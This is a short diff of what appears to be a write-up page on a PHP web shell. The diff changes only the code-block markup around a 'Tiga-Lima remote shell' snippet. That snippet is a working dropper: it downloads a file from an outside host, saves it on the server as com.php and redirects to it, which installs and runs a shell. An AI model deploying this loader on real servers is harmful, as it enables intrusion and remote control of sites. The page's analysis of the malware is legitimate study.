@@ -16,11 +16,11 @@ This is a very simple script that attempts to write the contents of a remote fil
 
 ### Tiga-Lima remote shell source code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 $namafile="com.php";
 $file = fopen($namafile ,'w+');
 $fa=file_get_contents('http://www.aliggroup.com/upload/log.txt');
 $write = fwrite ($file ,$fa);
 header ("location:com.php");
-?&gt;
-</pre>
+?>
+{% endhighlight %}
